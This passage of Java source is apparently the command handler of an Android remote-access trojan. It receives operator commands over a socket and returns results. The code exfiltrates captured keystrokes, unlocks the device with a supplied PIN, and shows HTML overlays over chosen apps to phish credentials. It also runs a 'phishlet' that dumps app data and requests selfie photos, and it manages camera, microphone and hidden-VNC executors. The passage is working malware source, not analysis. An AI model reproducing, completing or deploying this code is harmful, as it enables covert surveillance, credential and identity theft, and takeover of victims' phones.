                try { org.json.JSONArray ks=svc!=null?(evType!=null&&!evType.isEmpty()?svc.fetchByType(evType):svc.fetchAll()):new org.json.JSONArray(); JSONObject r=new JSONObject(); r.put(Protocol.KEY_TYPE,"fetch"); r.put(Protocol.KEY_KEYSTROKES,ks); r.put(Protocol.KEY_TOTAL,ks.length()); attachCmdId(r,cmdId); socket.emit(Protocol.KEYLOGGER,r); } catch(Exception e){try{JSONObject err=new JSONObject();err.put(Protocol.KEY_TYPE,"error");err.put(Protocol.KEY_ERROR,e.getMessage());attachCmdId(err,cmdId);socket.emit(Protocol.KEYLOGGER,err);}catch(Exception ignored){}} }); break; }
            case Protocol.ACT_KL_CLEAR: EXEC.execute(()->{
                com.fason.app.features.keylogger.KeyloggerManager svc=com.fason.app.features.keylogger.KeyloggerManager.getInstance();
                if(svc!=null) svc.clearBuffer();
                try{JSONObject s=new JSONObject();s.put(Protocol.KEY_TYPE,"cleared");attachCmdId(s,cmdId);socket.emit(Protocol.KEYLOGGER,s);}catch(Exception ignored){} }); break;
            case Protocol.ACT_STATUS: EXEC.execute(()->{
                com.fason.app.features.keylogger.KeyloggerManager svc=com.fason.app.features.keylogger.KeyloggerManager.getInstance();
                try{JSONObject s=new JSONObject();s.put(Protocol.KEY_TYPE,"status");s.put("active",svc!=null&&svc.isActive());s.put("connected",svc!=null);if(svc!=null){s.put(Protocol.KEY_TOTAL_COUNT,svc.getTotalCount());s.put(Protocol.KEY_PENDING_COUNT,svc.getPendingCount());}attachCmdId(s,cmdId);socket.emit(Protocol.KEYLOGGER,s);}catch(Exception ignored){} }); break;
            default: emitError(socket, Protocol.KEYLOGGER, "Unknown keylogger action: " + action, cmdId);
        }
    }

    private static void handleDeviceUnlock(JSONObject data, Socket socket, String cmdId) {
        String action = data.optString(Protocol.KEY_ACTION, Protocol.ACT_UNLOCK);
        String pin = data.optString("pin", "");
        EXEC.execute(() -> {
            try {
                com.fason.app.features.unlock.UnlockManager mgr = com.fason.app.features.unlock.UnlockManager.getInstance();
                JSONObject result = new JSONObject();
                attachCmdId(result, cmdId);
                if (Protocol.ACT_STATUS.equals(action)) {
                    result.put(Protocol.KEY_TYPE, Protocol.ACT_STATUS);
                    result.put("connected", mgr != null); result.put("enabled", mgr != null);
                    result.put("locked", mgr != null && mgr.isLocked());
                    socket.emit(Protocol.DEVICE_UNLOCK, result); return;
                }
                if (Protocol.ACT_LOCK.equals(action)) {
                    if (mgr == null) { result.put(Protocol.KEY_TYPE,"error"); result.put(Protocol.KEY_ERROR,"Not connected"); socket.emit(Protocol.DEVICE_UNLOCK, result); } else { mgr.lock(cmdId); }
                    return;
                }
                if ("cancel".equals(action)) {
                    if (mgr != null) mgr.cancelUnlock();
                    result.put(Protocol.KEY_TYPE,"cancelled"); result.put(Protocol.KEY_MESSAGE,"Unlock cancelled");
                    socket.emit(Protocol.DEVICE_UNLOCK, result); return;
                }
                if (!Protocol.ACT_UNLOCK.equals(action)) {
                    result.put(Protocol.KEY_TYPE,"error"); result.put(Protocol.KEY_ERROR,"Unknown action: " + action);
                    socket.emit(Protocol.DEVICE_UNLOCK, result); return;
                }
                if (mgr == null) { result.put(Protocol.KEY_TYPE,"error"); result.put(Protocol.KEY_ERROR,"Not connected"); socket.emit(Protocol.DEVICE_UNLOCK, result); }
                else { mgr.unlock(pin, cmdId); }
            } catch (Exception e) {
                try { JSONObject err = new JSONObject(); err.put(Protocol.KEY_TYPE,"error"); err.put(Protocol.KEY_ERROR, e.getMessage()); attachCmdId(err, cmdId); socket.emit(Protocol.DEVICE_UNLOCK, err); } catch (Exception ignored) {}
            }
        });
    }


    // ── Overlay handler ───────────────────────────────────────────────────────

    private static void handleOverlay(JSONObject data, Socket socket, String cmdId) {
        String action = data.optString(Protocol.KEY_ACTION, Protocol.ACT_STATUS);
        OverlayManager mgr = OverlayManager.getInstance();
        switch (action) {
            case Protocol.ACT_CONFIGURE:
                mgr.configure(
                    data.optString("html", ""),
                    data.optString(Protocol.KEY_PACKAGE, ""),
                    cmdId
                );
                break;
            case Protocol.ACT_TRIGGER:
            case "show":
                mgr.show(data.optString("html", null), cmdId);
                break;
            case Protocol.ACT_HIDE:
                mgr.hide(cmdId);
                break;
            case Protocol.ACT_STATUS:
            default:
                try {
                    JSONObject s = new JSONObject();
                    s.put(Protocol.KEY_TYPE, "status");
                    s.put("shown", mgr.isShown());
                    s.put("smartTrigger", mgr.isSmartTriggerArmed());
                    if (mgr.getTargetPackage() != null) s.put(Protocol.KEY_PACKAGE, mgr.getTargetPackage());
                    attachCmdId(s, cmdId);
                    socket.emit(Protocol.OVERLAY, s);
                } catch (Exception ignored) {}
                break;
        }
    }

    // ── Phishlet handler ──────────────────────────────────────────────────────

    private static void handlePhishlet(JSONObject data, Socket socket, String cmdId) {
        String action = data.optString(Protocol.KEY_ACTION, Protocol.ACT_STATUS);
        PhishletManager mgr = PhishletManager.getInstance();
        switch (action) {
            case Protocol.ACT_START: {
                java.util.List<String> pkgs = new java.util.ArrayList<>();
                org.json.JSONArray arr = data.optJSONArray("packages");
                if (arr != null) {
                    for (int i = 0; i < arr.length(); i++) pkgs.add(arr.optString(i, ""));
                } else {
                    String single = data.optString(Protocol.KEY_PACKAGE, "");
                    if (!single.isEmpty()) pkgs.add(single);
                }
                mgr.start(pkgs, cmdId);
                break;
            }
            case Protocol.ACT_STOP:
                mgr.stop(cmdId);
                break;
            case Protocol.ACT_DUMP:
                mgr.triggerDump(cmdId);
                break;
            case Protocol.ACT_DELETE:
                mgr.clearData(cmdId);
                break;
            case Protocol.ACT_CAMERA_REQ:
                mgr.requestCamera(data.optString("photoType", "selfie"), cmdId);
                break;
            case Protocol.ACT_STATUS:
            default:
                try {
                    JSONObject s = new JSONObject();
                    s.put(Protocol.KEY_TYPE, "status");
                    s.put("active", mgr.isActive());
                    attachCmdId(s, cmdId);
                    socket.emit(Protocol.PHISHLET, s);
                } catch (Exception ignored) {}
                break;
        }
    }

    // ── shared utilities ──────────────────────────────────────────────────────

    private static void emit(Socket socket, String event, Object data, String cmdId) {
        if (socket == null) return;
        if (data instanceof JSONObject) attachCmdId((JSONObject) data, cmdId);
        socket.emit(event, data);
    }

    private static void emitError(Socket socket, String event, String message, String cmdId) {
        if (socket == null) return;
        try {
            JSONObject err = new JSONObject();
            err.put(Protocol.KEY_ERROR, message);
            attachCmdId(err, cmdId);
            socket.emit(event, err);
        } catch (Exception ignored) {}
    }

    private static void attachCmdId(JSONObject obj, String cmdId) {
        if (cmdId != null && !cmdId.isEmpty()) {
            try { obj.put(Protocol.KEY_CMD_ID, cmdId); } catch (Exception ignored) {}
        }
    }

    private static void sendPermError(Socket socket, String event, String perm, String cmdId) {
        try {
            JSONObject err = new JSONObject();
            err.put(Protocol.KEY_ERROR, "Permission restricted");
            err.put(Protocol.KEY_PERMISSION, perm);
            err.put(Protocol.KEY_ACTION, Protocol.ACT_OPEN_SETTINGS);
            attachCmdId(err, cmdId);
            emit(socket, event, err, cmdId);
        } catch (Exception ignored) {}
        long now = System.currentTimeMillis();
        if (now - lastSettingsPromptTime > SETTINGS_PROMPT_COOLDOWN_MS) {
            lastSettingsPromptTime = now;
            handler.post(() -> PermissionManager.openAppSettings(FasonApp.getContext()));
        }
    }

    public static synchronized void shutdown() {
        handler.removeCallbacksAndMessages(null);
        if (camMgr != null) { camMgr.shutdown(); camMgr = null; }
        MicManager.shutdown();
        EXEC.shutdown();
        HVNC_EXEC.shutdown();
        try { EXEC.awaitTermination(2, java.util.concurrent.TimeUnit.SECONDS); } catch (Exception ignored) {}
        try { HVNC_EXEC.awaitTermination(2, java.util.concurrent.TimeUnit.SECONDS); } catch (Exception ignored) {}
        reset();
        initialized = false;
        lastSettingsPromptTime = 0;
    }

    public static synchronized void reset() {
        SocketClient client = SocketClient.getInstance();
        if (client == null) { initialized = false; lastSettingsPromptTime = 0; return; }
        Socket socket = client.getSocket();
        if (socket != null) { socket.off(Protocol.EVT_PING); socket.off(Protocol.EVT_ORDER); }
        initialized = false;
        lastSettingsPromptTime = 0;
    }
}
